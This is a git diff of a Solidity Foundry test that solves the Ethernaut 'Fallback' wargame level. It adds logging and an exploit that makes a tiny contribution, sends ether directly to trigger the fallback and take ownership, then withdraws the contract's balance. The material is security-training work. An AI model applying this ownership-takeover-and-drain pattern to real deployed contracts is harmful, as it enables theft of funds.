@@ -22,7 +22,7 @@ contract FallbackTest is Test {
         emit log_string("Setting up Fallback level...");
         ethernaut = new Ethernaut();
         // We need to give eve some funds to attack the contract
-        vm.deal(eve, 1 ether);
+        vm.deal(eve, 10 wei);
     }
 
     /*//////////////////////////////////////////////////////////////
@@ -35,19 +35,57 @@ contract FallbackTest is Test {
         //////////////////////////////////////////////////////////////*/
 
         FallbackFactory fallbackFactory = new FallbackFactory();
+
         ethernaut.registerLevel(fallbackFactory);
         vm.startPrank(eve);
 
         address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
         Fallback fallbackContract = Fallback(payable(levelAddress));
 
+        emit log_named_address(
+            "The original owner of the contract: ",
+            fallbackContract.owner()
+        );
+        emit log_named_address(
+            "Address of the exploit contract: ",
+            address(this)
+        );
+        emit log_named_address("Eve's address: ", address(eve));
+        emit log_named_uint("Balance of Eve (before): ", eve.balance);
+        emit log_named_uint(
+            "Contract balance (before): ",
+            address(fallbackContract).balance
+        );
+
         /*//////////////////////////////////////////////////////////////
                                 LEVEL EXPLOIT
         //////////////////////////////////////////////////////////////*/
 
-        /**
-         * CODE GOES HERE
-         */
+        fallbackContract.contribute.value(1 wei)();
+        emit log_named_uint(
+            "Eve's contribution: ",
+            fallbackContract.getContribution()
+        );
+
+        (bool success, ) = address(fallbackContract).call.value(1 wei)("");
+        require(success);
+
+        emit log_named_uint(
+            "Balance of the contract before withdrawal: ",
+            address(fallbackContract).balance
+        );
+
+        fallbackContract.withdraw();
+
+        emit log_named_uint(
+            "Ending balance of the contract: ",
+            address(fallbackContract).balance
+        );
+        emit log_named_address(
+            "New owner of the contract: ",
+            fallbackContract.owner()
+        );
+        emit log_named_uint("Balance of Eve (after): ", eve.balance);
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL SUBMISSION
@@ -67,7 +105,7 @@ contract FallbackTest is Test {
     /**
      * I've found this useful function
      * in github/twpony Ethernaut repo
-     * @notice This functions lets us create labels (names) for addresses
+     * @notice This function allows for creating labels (names) for addresses
      * which will improve readability in traces
      * @param name you pass the name like "alice" or "bob" and it will create
      * an address for that person
